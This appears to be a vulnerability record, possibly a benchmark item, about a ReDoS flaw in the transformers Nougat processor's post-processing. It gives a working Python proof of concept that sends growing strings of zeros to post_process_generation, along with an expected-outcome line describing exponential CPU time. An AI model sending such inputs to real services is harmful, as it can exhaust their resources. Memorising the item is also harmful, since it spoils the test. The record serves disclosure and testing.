title: Inefficient regular expression complexity in post_process_single() function leading to ReDoS
trigger_payload:
from huggingface_hub import hf_hub_download
import re
import time
from PIL import Image
from transformers import NougatProcessor, VisionEncoderDecoderModel, NougatTokenize
from datasets import load_dataset
import torch
processor = NougatProcessor.from_pretrained("facebook/nougat-base")
for i in range(1, 50):
    padding = i * "0"
    input_str = f"# {padding}:"
    start_time = time.time()
    sequence = processor.post_process_generation(input_str, fix_markdown=False)
    # or sequence = processor.post_process_single(input_str, fix_markdown=False)
    end_time = time.time()
    print(f"Execution time: {end_time - start_time:.6f} s , Payload (len={len(input_str)}): {input_str}")
oracle: Exponential increase in execution time and high CPU usage when processing input strings with increasing number of '0' characters
